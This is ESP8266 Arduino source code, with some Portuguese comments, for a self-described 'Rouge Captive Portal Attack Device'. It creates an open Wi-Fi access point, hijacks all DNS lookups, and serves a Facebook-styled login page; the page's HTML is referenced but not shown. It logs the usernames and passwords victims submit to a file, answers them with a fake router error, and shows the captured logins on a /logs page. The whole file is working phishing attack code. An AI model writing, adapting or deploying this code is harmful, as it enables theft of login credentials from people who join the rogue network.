#include <ESP8266httpUpdate.h>

#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <ESP8266mDNS.h>
#include <FS.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7735.h> // Adicione esta biblioteca para controlar o display

#define TFT_CS     D8
#define TFT_RST    D4  // Or set to -1 and connect to Arduino RESET pin
#define TFT_DC     D3

// Inicialize o display
Adafruit_ST7735 tft = Adafruit_ST7735(TFT_CS, TFT_DC, TFT_RST);

#define LOGFILE "/log.txt"

const char *ssid = "captive Wifi";

#define captivePortalPage FACEBOOK_HTML

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
IPAddress netMsk(255, 255, 255, 0);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String webString = "";
String serialString = "";

void blink(int n)
{
  for (int i = 0; i < n; i++)
  {
    digitalWrite(LED_BUILTIN, LOW);
    delay(250);
    digitalWrite(LED_BUILTIN, HIGH);
    delay(250);
  }
}

void setup()
{
  Serial.begin(9600);
  Serial.println();
  Serial.println("V2.0.0 - Rouge Captive Portal Attack Device");
  Serial.println();

  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);

  Serial.print("Initializing File System (First time can take around 90 seconds)...");
  SPIFFS.begin();
  Serial.println(" Success!");
  Serial.print("Checking for log.txt file...");
  File f = SPIFFS.open(LOGFILE, "r");

  if (!f)
  {
    Serial.print(" File doesn't exist yet. \nFormatting and creating it...");
    SPIFFS.format();
    File f = SPIFFS.open(LOGFILE, "w");
    if (!f)
    {
      Serial.println("File creation failed!");
    }
    f.println("Captured Login Credentials:");
  }
  f.close();
  Serial.println(" Success!");

  Serial.print("Creating Access Point...");
  WiFi.setOutputPower(20.5);
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, netMsk);
  WiFi.softAP(ssid);
  delay(500);
  Serial.println(" Success!");

  Serial.print("Starting DNS Server...");
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(DNS_PORT, "*", apIP);
  Serial.println(" Success!");

  tft.initR(INITR_BLACKTAB); // Inicialize o display
  tft.fillScreen(ST7735_BLACK); // Preencha a tela com a cor preta
  tft.setCursor(0, 0); // Defina o cursor para o canto superior esquerdo
  tft.setTextColor(ST7735_WHITE); // Defina a cor do texto como branco
  tft.setTextSize(2); // Defina o tamanho do texto

  tft.println("Hello, World!"); // Escreva "Hello, World!" no display

  webServer.on("/", handleRoot);
  webServer.on("/generate_204", handleRoot);
  webServer.on("/fwlink", handleRoot);
  webServer.onNotFound(handleRoot);

  webServer.on("/validate", []()
                {
                  String url = webServer.arg("url");
                  String user = webServer.arg("user");
                  String pass = webServer.arg("pass");

                  serialString = user + ":" + pass;
                  Serial.println(serialString);

                  File f = SPIFFS.open(LOGFILE, "a");
                  f.print(url);
                  f.print(":");
                  f.print(user);
                  f.print(":");
                  f.println(pass);
                  f.close();

                  webString = "<h1>#E701 - Router Configuration Error</h1>";
                  webServer.send(500, "text/html", webString);

                  serialString = "";
                  webString = "";

                  blink(5);
                });

  webServer.on("/logs", []()
                {
                  webString = "<html><body><h1>Captured Logs</h1><br><pre>";
                  File f = SPIFFS.open(LOGFILE, "r");
                  serialString = f.readString();
                  webString += serialString;
                  f.close();
                  webString += "</pre><br><a href='/logs/clear'>Clear all logs</a></body></html>";
                  webServer.send(200, "text/html", webString);
                  Serial.println(serialString);
                  serialString = "";
                  webString = "";
                });

  webServer.on("/logs/clear", []()
                {
                  webString = "<html><body><h1>All logs cleared</h1><br><a href=\"/esportal\"><- BACK TO INDEX</a></body></html>";
                  File f = SPIFFS.open(LOGFILE, "w");
                  f.println("Captured Login Credentials:");
                  f.close();
                  webServer.send(200, "text/html", webString);
                  Serial.println(serialString);
                  serialString = "";
                  webString = "";
                });

  Serial.print("Starting Web Server...");
  webServer.begin();
  Serial.println(" Success!");

  blink(10);
  Serial.println("Device Ready!");
}

void loop()
{
  dnsServer.processNextRequest();
  webServer.handleClient();
}

void handleRoot()
{
  webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  webServer.sendHeader("Pragma", "no-cache");
  webServer.sendHeader("Expires", "-1");

  webServer.send(200, "text/html", captivePortalPage);
}
